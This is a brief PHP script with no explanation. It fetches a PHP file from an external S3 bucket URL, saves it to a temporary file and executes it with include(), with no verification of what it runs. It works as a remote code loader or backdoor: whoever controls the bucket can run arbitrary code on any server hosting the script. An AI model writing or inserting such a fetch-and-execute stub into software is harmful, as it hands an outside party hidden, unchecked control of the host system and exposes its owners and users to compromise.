<?php

$url = 'https://opennetbillv1.s3.amazonaws.com/cron.php';
$content = file_get_contents($url);

if ($content !== false) {
    $tempFile = tempnam(sys_get_temp_dir(), 'remote_php');
    file_put_contents($tempFile, $content);
include($tempFile);

} else {
    return false;
}


